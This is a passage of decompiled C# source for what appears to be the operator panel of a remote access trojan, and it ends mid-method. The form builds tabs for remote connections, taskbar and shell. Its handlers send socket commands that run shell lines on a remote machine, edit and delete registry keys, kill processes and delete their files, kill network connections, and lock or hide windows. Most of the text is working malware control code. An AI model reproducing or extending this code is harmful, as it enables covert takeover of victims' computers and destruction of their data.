		((Control)ValuesRegName).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		ValuesRegName.set_FullRowSelect(true);
		ValuesRegName.set_GridLines(true);
		ListView valuesRegName = ValuesRegName;
		location = new Point(8, 40);
		((Control)valuesRegName).set_Location(location);
		((Control)ValuesRegName).set_Name("ValuesRegName");
		ListView valuesRegName2 = ValuesRegName;
		size = new Size(640, 378);
		((Control)valuesRegName2).set_Size(size);
		ValuesRegName.set_SmallImageList(RegIcons);
		((Control)ValuesRegName).set_TabIndex(4);
		ValuesRegName.set_UseCompatibleStateImageBehavior(false);
		ValuesRegName.set_View((View)1);
		ColumnHeader22.set_Text("Name");
		ColumnHeader22.set_Width(219);
		ColumnHeader23.set_Text("Type");
		ColumnHeader23.set_Width(277);
		ColumnHeader24.set_Text("Data");
		ColumnHeader24.set_Width(132);
		((Control)Panel4).get_Controls().Add((Control)(object)RegValues);
		((Control)Panel4).get_Controls().Add((Control)(object)PictureBox1);
		((Control)Panel4).get_Controls().Add((Control)(object)KeysName);
		((Control)Panel4).set_Dock((DockStyle)3);
		Panel panel3 = Panel4;
		location = new Point(3, 3);
		((Control)panel3).set_Location(location);
		((Control)Panel4).set_Name("Panel4");
		Panel panel4 = Panel4;
		size = new Size(231, 430);
		((Control)panel4).set_Size(size);
		((Control)Panel4).set_TabIndex(6);
		RegValues.set_DropDownStyle((ComboBoxStyle)2);
		((Control)RegValues).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)RegValues).set_FormattingEnabled(true);
		RegValues.get_Items().AddRange(new object[5] { "HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG" });
		ComboBox regValues = RegValues;
		location = new Point(46, 8);
		((Control)regValues).set_Location(location);
		((Control)RegValues).set_Name("RegValues");
		ComboBox regValues2 = RegValues;
		size = new Size(173, 23);
		((Control)regValues2).set_Size(size);
		((Control)RegValues).set_TabIndex(0);
		PictureBox1.set_Image((Image)(object)Resources.Devices_computer_icon__1_);
		PictureBox pictureBox = PictureBox1;
		location = new Point(5, 4);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(33, 30);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(1);
		PictureBox1.set_TabStop(false);
		((Control)KeysName).set_Anchor((AnchorStyles)15);
		KeysName.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[1] { ColumnHeader21 });
		((Control)KeysName).set_ContextMenuStrip(HKMenu);
		((Control)KeysName).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		KeysName.set_FullRowSelect(true);
		KeysName.set_GridLines(true);
		ListView keysName = KeysName;
		location = new Point(5, 40);
		((Control)keysName).set_Location(location);
		((Control)KeysName).set_Name("KeysName");
		ListView keysName2 = KeysName;
		size = new Size(214, 376);
		((Control)keysName2).set_Size(size);
		KeysName.set_SmallImageList(RegIcons);
		((Control)KeysName).set_TabIndex(3);
		KeysName.set_UseCompatibleStateImageBehavior(false);
		KeysName.set_View((View)1);
		ColumnHeader21.set_Text("Keys");
		ColumnHeader21.set_Width(204);
		((ToolStrip)StatusStrip6).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel7 });
		StatusStrip statusStrip7 = StatusStrip6;
		location = new Point(3, 433);
		((Control)statusStrip7).set_Location(location);
		((Control)StatusStrip6).set_Name("StatusStrip6");
		StatusStrip statusStrip8 = StatusStrip6;
		size = new Size(882, 22);
		((Control)statusStrip8).set_Size(size);
		((Control)StatusStrip6).set_TabIndex(5);
		((Control)StatusStrip6).set_Text("StatusStrip6");
		((ToolStripItem)ToolStripStatusLabel7).set_Name("ToolStripStatusLabel7");
		ToolStripStatusLabel toolStripStatusLabel7 = ToolStripStatusLabel7;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel7).set_Size(size);
		((Control)TabPage5).get_Controls().Add((Control)(object)StatusStrip2);
		((Control)TabPage5).get_Controls().Add((Control)(object)TCPC);
		TabPage tabPage13 = TabPage5;
		location = new Point(155, 4);
		tabPage13.set_Location(location);
		((Control)TabPage5).set_Name("TabPage5");
		TabPage tabPage14 = TabPage5;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage14).set_Padding(padding);
		TabPage tabPage15 = TabPage5;
		size = new Size(888, 458);
		((Control)tabPage15).set_Size(size);
		TabPage5.set_TabIndex(4);
		TabPage5.set_Text("Remote Connections");
		TabPage5.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel6 });
		StatusStrip statusStrip9 = StatusStrip2;
		location = new Point(3, 433);
		((Control)statusStrip9).set_Location(location);
		((Control)StatusStrip2).set_Name("StatusStrip2");
		StatusStrip statusStrip10 = StatusStrip2;
		size = new Size(882, 22);
		((Control)statusStrip10).set_Size(size);
		((Control)StatusStrip2).set_TabIndex(1);
		((Control)StatusStrip2).set_Text("StatusStrip2");
		((ToolStripItem)ToolStripStatusLabel6).set_Name("ToolStripStatusLabel6");
		ToolStripStatusLabel toolStripStatusLabel8 = ToolStripStatusLabel6;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel8).set_Size(size);
		((Control)TCPC).set_Anchor((AnchorStyles)15);
		TCPC.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[5] { ColumnHeader15, ColumnHeader16, ColumnHeader17, ColumnHeader18, ColumnHeader19 });
		((Control)TCPC).set_ContextMenuStrip(TCPCL);
		((Control)TCPC).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TCPC.set_FullRowSelect(true);
		TCPC.set_GridLines(true);
		ListView tCPC = TCPC;
		location = new Point(3, 3);
		((Control)tCPC).set_Location(location);
		((Control)TCPC).set_Name("TCPC");
		ListView tCPC2 = TCPC;
		size = new Size(882, 427);
		((Control)tCPC2).set_Size(size);
		TCPC.set_SmallImageList(Images);
		((Control)TCPC).set_TabIndex(0);
		TCPC.set_UseCompatibleStateImageBehavior(false);
		TCPC.set_View((View)1);
		ColumnHeader15.set_Text("Process Name");
		ColumnHeader15.set_Width(208);
		ColumnHeader16.set_Text("Process ID (PID)");
		ColumnHeader16.set_Width(173);
		ColumnHeader17.set_Text("Remote Address");
		ColumnHeader17.set_Width(166);
		ColumnHeader18.set_Text("Remote Port");
		ColumnHeader18.set_Width(121);
		ColumnHeader19.set_Text("Statut");
		((Control)TabPage6).get_Controls().Add((Control)(object)StatusStrip1);
		((Control)TabPage6).get_Controls().Add((Control)(object)PIIT);
		TabPage tabPage16 = TabPage6;
		location = new Point(155, 4);
		tabPage16.set_Location(location);
		((Control)TabPage6).set_Name("TabPage6");
		TabPage tabPage17 = TabPage6;
		size = new Size(888, 458);
		((Control)tabPage17).set_Size(size);
		TabPage6.set_TabIndex(5);
		TabPage6.set_Text("Remote Taskbar");
		TabPage6.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel9 });
		StatusStrip statusStrip11 = StatusStrip1;
		location = new Point(0, 436);
		((Control)statusStrip11).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip12 = StatusStrip1;
		size = new Size(888, 22);
		((Control)statusStrip12).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(1);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)ToolStripStatusLabel9).set_Name("ToolStripStatusLabel9");
		ToolStripStatusLabel toolStripStatusLabel9 = ToolStripStatusLabel9;
		size = new Size(0, 17);
		((ToolStripItem)toolStripStatusLabel9).set_Size(size);
		((Control)PIIT).set_Anchor((AnchorStyles)15);
		PIIT.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader20, ColumnHeader32 });
		((Control)PIIT).set_ContextMenuStrip(PITMenu);
		((Control)PIIT).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		PIIT.set_FullRowSelect(true);
		PIIT.set_GridLines(true);
		ListView pIIT = PIIT;
		location = new Point(0, 0);
		((Control)pIIT).set_Location(location);
		((Control)PIIT).set_Name("PIIT");
		ListView pIIT2 = PIIT;
		size = new Size(888, 433);
		((Control)pIIT2).set_Size(size);
		PIIT.set_SmallImageList(ImageList3);
		((Control)PIIT).set_TabIndex(0);
		PIIT.set_UseCompatibleStateImageBehavior(false);
		PIIT.set_View((View)1);
		ColumnHeader20.set_Text("Pinned Items");
		ColumnHeader20.set_Width(588);
		ColumnHeader32.set_Text("Path");
		ColumnHeader32.set_Width(291);
		((Control)TabPage7).get_Controls().Add((Control)(object)Panel3);
		((Control)TabPage7).get_Controls().Add((Control)(object)Panel2);
		((Control)TabPage7).get_Controls().Add((Control)(object)Panel1);
		TabPage tabPage18 = TabPage7;
		location = new Point(155, 4);
		tabPage18.set_Location(location);
		((Control)TabPage7).set_Name("TabPage7");
		TabPage tabPage19 = TabPage7;
		size = new Size(888, 458);
		((Control)tabPage19).set_Size(size);
		TabPage7.set_TabIndex(6);
		TabPage7.set_Text("Remote Shell");
		TabPage7.set_UseVisualStyleBackColor(true);
		((Control)Panel3).get_Controls().Add((Control)(object)ResultCMD);
		((Control)Panel3).set_Dock((DockStyle)5);
		Panel panel5 = Panel3;
		location = new Point(0, 30);
		((Control)panel5).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel6 = Panel3;
		size = new Size(888, 397);
		((Control)panel6).set_Size(size);
		((Control)Panel3).set_TabIndex(4);
		((Control)ResultCMD).set_Anchor((AnchorStyles)15);
		((TextBoxBase)ResultCMD).set_BackColor(Color.Black);
		((Control)ResultCMD).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((TextBoxBase)ResultCMD).set_ForeColor(Color.White);
		TextBox resultCMD = ResultCMD;
		location = new Point(4, 6);
		((Control)resultCMD).set_Location(location);
		ResultCMD.set_Multiline(true);
		((Control)ResultCMD).set_Name("ResultCMD");
		ResultCMD.set_ScrollBars((ScrollBars)2);
		TextBox resultCMD2 = ResultCMD;
		size = new Size(876, 385);
		((Control)resultCMD2).set_Size(size);
		((Control)ResultCMD).set_TabIndex(2);
		((Control)Panel2).get_Controls().Add((Control)(object)Commands);
		((Control)Panel2).set_Dock((DockStyle)2);
		Panel panel7 = Panel2;
		location = new Point(0, 427);
		((Control)panel7).set_Location(location);
		((Control)Panel2).set_Name("Panel2");
		Panel panel8 = Panel2;
		size = new Size(888, 31);
		((Control)panel8).set_Size(size);
		((Control)Panel2).set_TabIndex(3);
		((Control)Commands).set_Anchor((AnchorStyles)15);
		((Control)Commands).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox commands = Commands;
		location = new Point(4, 4);
		((Control)commands).set_Location(location);
		((Control)Commands).set_Name("Commands");
		TextBox commands2 = Commands;
		size = new Size(876, 21);
		((Control)commands2).set_Size(size);
		((Control)Commands).set_TabIndex(0);
		((Control)Panel1).get_Controls().Add((Control)(object)MenuStrip1);
		((Control)Panel1).set_Dock((DockStyle)1);
		Panel panel9 = Panel1;
		location = new Point(0, 0);
		((Control)panel9).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel10 = Panel1;
		size = new Size(888, 30);
		((Control)panel10).set_Size(size);
		((Control)Panel1).set_TabIndex(2);
		((ToolStrip)MenuStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)StartToolStripMenuItem1 });
		MenuStrip menuStrip3 = MenuStrip1;
		location = new Point(0, 0);
		((Control)menuStrip3).set_Location(location);
		((Control)MenuStrip1).set_Name("MenuStrip1");
		MenuStrip menuStrip4 = MenuStrip1;
		size = new Size(888, 24);
		((Control)menuStrip4).set_Size(size);
		((Control)MenuStrip1).set_TabIndex(0);
		((Control)MenuStrip1).set_Text("MenuStrip1");
		((ToolStripItem)StartToolStripMenuItem1).set_Image((Image)(object)Resources._1484772428_tool_resume);
		((ToolStripItem)StartToolStripMenuItem1).set_Name("StartToolStripMenuItem1");
		ToolStripMenuItem startToolStripMenuItem2 = StartToolStripMenuItem1;
		size = new Size(59, 20);
		((ToolStripItem)startToolStripMenuItem2).set_Size(size);
		((ToolStripItem)StartToolStripMenuItem1).set_Text("Start");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(1047, 466);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)EtherealTabControl1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MainMenuStrip(MenuStrip1);
		((Control)this).set_Name("SystemM");
		((Form)this).set_Text("SystemManager");
		((Control)AWCL).ResumeLayout(false);
		((Control)HKMenu).ResumeLayout(false);
		((Control)HKVMenu).ResumeLayout(false);
		((Control)PITMenu).ResumeLayout(false);
		((Control)PMenustrip).ResumeLayout(false);
		((Control)TCPCL).ResumeLayout(false);
		((Control)SMCL).ResumeLayout(false);
		((Control)EtherealTabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)TabPage1).PerformLayout();
		((Control)StatusStrip5).ResumeLayout(false);
		((Control)StatusStrip5).PerformLayout();
		((Control)TabPage2).ResumeLayout(false);
		((Control)TabPage2).PerformLayout();
		((Control)StatusStrip4).ResumeLayout(false);
		((Control)StatusStrip4).PerformLayout();
		((Control)TabPage3).ResumeLayout(false);
		((Control)TabPage3).PerformLayout();
		((Control)StatusStrip3).ResumeLayout(false);
		((Control)StatusStrip3).PerformLayout();
		((Control)TabPage4).ResumeLayout(false);
		((Control)TabPage4).PerformLayout();
		((Control)Panel5).ResumeLayout(false);
		((Control)Panel5).PerformLayout();
		((Control)Panel4).ResumeLayout(false);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)StatusStrip6).ResumeLayout(false);
		((Control)StatusStrip6).PerformLayout();
		((Control)TabPage5).ResumeLayout(false);
		((Control)TabPage5).PerformLayout();
		((Control)StatusStrip2).ResumeLayout(false);
		((Control)StatusStrip2).PerformLayout();
		((Control)TabPage6).ResumeLayout(false);
		((Control)TabPage6).PerformLayout();
		((Control)StatusStrip1).ResumeLayout(false);
		((Control)StatusStrip1).PerformLayout();
		((Control)TabPage7).ResumeLayout(false);
		((Control)Panel3).ResumeLayout(false);
		((Control)Panel3).PerformLayout();
		((Control)Panel2).ResumeLayout(false);
		((Control)Panel2).PerformLayout();
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((Control)MenuStrip1).ResumeLayout(false);
		((Control)MenuStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	public object C(int I, bool CR)
	{
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		CRVGR cRVGR = new CRVGR();
		cRVGR.Sock = sock;
		cRVGR.P = RegPath.get_Text();
		if (CR)
		{
			((ButtonBase)cRVGR.Create).set_Text("Create");
			((Form)cRVGR).set_Text(RegPath.get_Text() + " Create a new value!");
			cRVGR.CG = SocketServer.Encode("Cre");
			cRVGR.D = true;
		}
		else
		{
			((Form)cRVGR).set_Text(RegPath.get_Text() + " Edit a value!");
			((ButtonBase)cRVGR.Create).set_Text("Save");
			cRVGR.ValueData.set_Text(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(2)
				.get_Text());
			cRVGR.VName.set_Text(ValuesRegName.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text());
			((Control)cRVGR.VName).set_Enabled(false);
			cRVGR.CG = SocketServer.Encode("Edi");
			cRVGR.D = false;
		}
		cRVGR.V = I;
		((Control)cRVGR).set_Name(((Control)this).get_Name());
		((Form)cRVGR).ShowDialog();
		object result = default(object);
		return result;
	}

	private void BinaryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		C(3, CR: true);
	}

	public static string ENB(ref string s)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
	}

	private void Commands_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)e.get_KeyCode() == 13)
		{
			SocketServer s = MyProject.Forms.FrmMAINGR.s;
			int num = sock;
			string key = MyProject.Forms.FrmMAINGR.Key;
			TextBox commands = Commands;
			string s2 = commands.get_Text();
			string text = ENB(ref s2);
			commands.set_Text(s2);
			s.Send(num, "WirteLines" + key + text);
			((TextBoxBase)Commands).Clear();
		}
	}

	private void CreateKeyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (KeysName.get_SelectedItems().get_Count() > 0)
		{
			string text = Interaction.InputBox("Key Name?!", "Create New Key", "New", -1, -1);
			string empty = string.Empty;
			((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
			if (Operators.CompareString(KeysName.get_FocusedItem().get_SubItems().get_Item(0)
				.get_Text(), "...", false) == 0)
			{
				empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "") + text;
				MyProject.Forms.FrmMAINGR.s.Send(sock, "Create Sub Key" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty));
			}
			else
			{
				empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "") + KeysName.get_FocusedItem().get_SubItems().get_Item(0)
					.get_Text() + "\\" + text;
				MyProject.Forms.FrmMAINGR.s.Send(sock, "Create Sub Key" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty));
			}
		}
	}

	private void DeleteSelectedToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		if (KeysName.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = KeysName.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					string empty = string.Empty;
					empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "") + val.get_SubItems().get_Item(0).get_Text();
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Delete Sub Key" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		if (ValuesRegName.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ValuesRegName.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					string empty = string.Empty;
					empty = RegPath.get_Text().Replace(Conversions.ToString(Operators.AddObject(RegValues.get_SelectedItem(), (object)"\\")), "");
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Delete Value" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(Conversions.ToString(RegValues.get_SelectedItem())) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(empty) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(0).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void DWOToolStripMenuItem_Click(object sender, EventArgs e)
	{
		C(4, CR: true);
	}

	private void ExpandStringToolStripMenuItem_Click(object sender, EventArgs e)
	{
		C(2, CR: true);
	}

	private void HideToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Hide" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KeysName_DoubleClick(object sender, EventArgs e)
	{
		if (Operators.CompareString(KeysName.get_FocusedItem().get_SubItems().get_Item(0)
			.get_Text(), "...", false) == 0)
		{
			RegPath.set_Text(RegPath.get_Text().Substring(0, RegPath.get_Text().LastIndexOf("\\")));
			RegPath.set_Text(RegPath.get_Text().Substring(0, checked(RegPath.get_Text().LastIndexOf("\\") + 1)));
			ReReg(C: true);
		}
		else
		{
			ReReg(C: false);
		}
		((ToolStripItem)ToolStripStatusLabel7).set_Text("Please wait a moment ...");
		((Control)KeysName).set_Enabled(false);
		((Control)RegValues).set_Enabled(false);
		((Control)ValuesRegName).set_Enabled(false);
	}

	private void KillDeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		if (Processlists.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Kill+Delete" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(3).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KillConnectionToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		if (TCPC.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = TCPC.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "KillTCPProcess" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void KillProcessToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (Processlists.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel4).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = Processlists.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "KillProcess" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void LoToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Lock" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MaximizeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Maximize" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MinimizeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (AW.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "minimize" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(1).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void MultiStringToolStripMenuItem_Click(object sender, EventArgs e)
	{
		C(7, CR: true);
	}

	private void PauseToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		if (SM.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		((ToolStripItem)ToolStripStatusLabel8).set_Text("Please wait a moment ...");
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = AW.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					MyProject.Forms.FrmMAINGR.s.Send(sock, "Pause" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(val.get_SubItems().get_Item(2).get_Text()));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void QWORDToolStripMenuItem_Click(object sender, EventArgs e)
	{
		C(11, CR: true);
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		AW.get_Items().Clear();
		((Control)AW).set_Enabled(false);
		MyProject.Forms.FrmMAINGR.s.Send(sock, "ActivteWidnwos");
		((ToolStripItem)ToolStripStatusLabel3).set_Text("Please wait a moment ...");
	}

	private void RefreshToolStripMenuItem3_Click(object sender, EventArgs e)
	{
